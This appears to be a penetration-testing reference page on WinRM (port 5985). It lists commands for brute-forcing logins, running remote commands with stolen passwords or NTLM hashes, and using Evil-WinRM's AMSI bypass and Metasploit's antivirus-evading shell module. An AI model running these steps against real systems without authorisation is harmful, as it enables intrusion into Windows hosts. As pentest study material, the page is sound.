---
description: >-
  Windows Remote Management (WinRM) is the Microsoft implementation of
  WS-Management Protocol, a standard Simple Object Access Protocol (SOAP)-based.
  Usaully run on port 5985.
---

# 5985 - WinRM

## Info

WinRM uses the PSRemoting \(PowerShell remote\) to login to a host and execute commands.

You can enable WinRM by running `Enable-PSRemoting`

By default WinRM uses port 5985 for sending traffic over HTTP \(But it's still encrypted\), and port 5986 for SSL.

If you can make a HTTP request \(GET\) to `/wsman` and you get 200 back, WinRM  is enabled \(on port 5985\).

### Add User to winrm group

```text
net localgroup "Remote Management Users" /add bowen
```

## Bruteforce login

### Metasploit

The winrm\_login module is a standard Metasploit login scanner to bruteforce passwords.

`use auxiliary/scanner/winrm/winrm_login`

### Crackmapexec

`cme winrm 192.168.1.0/24 -u userfile -p passwordfile`

## Login from windows

### Powershell

From a powershell command prompt:

```text
$pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force 
$cred = New-Object System.Management.Automation.PSCredential ('ECORP.local\morph3', $pass) 
Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }
```

###  Winrs

Winrs.exe is a built-in command line tool that allows for the execution of remote commands over WinRm with a properly credentialed user.

```text
winrs -r:corp-dc "whoami /all"
```

###  **Winrm.cmd**

Command–line tool for system management is implemented in a Visual Basic Scripting Edition file \(Winrm.vbs\) written using the WinRM scripting API.

```text
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="notepad"} -r:corp-dc
```

## Login from Linux

### Ruby Script

A quick and dirty script - use  [Alamot’s Ruby script](https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb)  

Remember to change the username and password 

### Evil-WinRM

A comprehensive winrm shell

[https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

Install:

```text
sudo apt install ruby-dev build-essential
sudo gem install evil-winrm
```

You can also execute built in 'Bypass-AMSI', 'DLL-loader', 'Dount Loader' and 'Invoke Binary' straight from the shell by just typing `menu` in the shell

We can also load powershell scripts using the `-s` option and providing a folder with scripts, and then just calling the script from the shell \(example typing `powerup.ps` \)and then when we go to the menu it will show the functions from that script.

### CrackMapexec

Here’s an example of using CrackMapExec winrm method as local Administrator with a clear text password:

`crackmapexec winrm -d . -u Administrator -p 'pass123' -x "whoami" 192.168.204.183` 

Here’s example using a NTLM hash:

`crackmapexec winrm -d . -u Administrator -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 -x "whoami" 192.168.204.183`

### Metasploit

WinRM Script Exec exploit module can obtain a shell without triggering an anti-virus solution, in certain cases. This module has two different payload delivery methods. Its primary delivery method is through the use of PowerShell 2.0. The module checks to see if PowerShell 2.0 is available on the system. It then tries to enable unrestricted script execution, an important step because PowerShell does not execute unsigned script files by default. If either of these checks fail, it will default to the VBS CmdStager payload method, otherwise it will use our Powershell 2.0 method.

`use exploit/windows/winrm/winrm_script_exec`

